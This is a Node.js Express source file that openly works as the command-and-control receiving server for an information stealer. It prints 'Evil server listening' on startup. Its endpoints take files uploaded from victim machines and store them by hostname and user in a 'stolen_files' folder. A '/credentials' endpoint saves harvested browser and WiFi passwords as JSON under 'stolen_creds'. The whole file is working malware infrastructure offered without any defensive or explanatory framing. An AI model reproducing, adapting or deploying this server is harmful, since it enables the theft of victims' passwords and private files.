const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const dotenv = require('dotenv');
const morgan = require('morgan');
dotenv.config();
const app = express();
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        const hostname = req.body.hostname || 'unknown';
        const user = req.body.user || 'unknown';
        const folderPath = path.join(__dirname, 'stolen_files', hostname, user);
        if (!fs.existsSync(folderPath)) {
            fs.mkdirSync(folderPath, { recursive: true });
        }
        cb(null, folderPath);
    },
    filename: function (req, file, cb) {
        const timestamp = Date.now();
        cb(null, `${timestamp}_${file.originalname}`);
    }
});
const upload_one = multer({ storage: storage });
app.use(morgan('dev'));
app.use(express.json());
app.post('/upload', upload_one.single('files'), (req, res) => {
    console.log(`[+] Received files from ${req.body.hostname} (${req.body.user})`);
    console.log(`[+] File saved: ${req.file.path}`);
    res.status(200).send('Files received successfully');
});
const storage_ = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, "uploads/"); 
  },
  filename: (req, file, cb) => {
    const uniqueName = Date.now() + "-" + file.originalname;
    cb(null, uniqueName);
  },
});
const upload = multer({ storage_ });
app.post("/upload_raw", upload.array("files"), (req, res) => {
  try {
    const files = req.files;
    if (!files || files.length === 0) {
      return res.status(400).json({ message: "No files uploaded" });
    }
    const bodyData = req.body;
    res.json({
      message: "Files uploaded successfully",
      count: files.length,
      files: files.map(f => ({
        filename: f.filename,
        originalName: f.originalname,
        path: f.path,
      })),
      data: bodyData,
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Server error" });
  }
});
app.post('/credentials', (req, res) => {
    const { hostname, user, browser_passwords, wifi_passwords } = req.body;
    console.log(`[+] Received credentials from ${hostname} (${user})`);
    const credsPath = path.join(__dirname, 'stolen_creds', hostname);
    if (!fs.existsSync(credsPath)) {
        fs.mkdirSync(credsPath, { recursive: true });
    }
    const filename = `${Date.now()}_credentials.json`;
    const filePath = path.join(credsPath, filename);
    fs.writeFileSync(filePath, JSON.stringify(req.body, null, 2));
    console.log(`[+] Saved ${browser_passwords?.length || 0} browser passwords`);
    console.log(`[+] Saved ${wifi_passwords?.length || 0} WiFi passwords`);
    res.status(200).send('Credentials received');
});
app.listen(process.env.PORT, "0.0.0.0",() => {
    console.log(`[+] Evil server listening on port ${process.env.PORT}`);
});